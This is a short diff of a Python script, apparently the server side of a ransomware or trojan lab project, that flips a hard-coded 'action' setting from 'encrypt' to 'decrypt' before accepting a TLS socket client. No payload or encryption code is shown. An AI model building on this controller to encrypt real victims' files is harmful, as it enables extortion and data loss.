@@ -121,7 +121,7 @@ if __name__ == "__main__":
     PORT = 44444
     CERT = "D:\python_programmers_clab\TROJAN_RANSOMEWARE/cert.pem"
     KEY = "D:\python_programmers_clab\TROJAN_RANSOMEWARE/key.pem"
-    action = "encrypt"  # enter "encrypt" or " decrypt" manually
+    action = "decrypt"  # enter "encrypt" or "decrypt" manually
 
     conn = SecureSocketServer(HOST, PORT, CERT, KEY).accept_client()
     with conn:
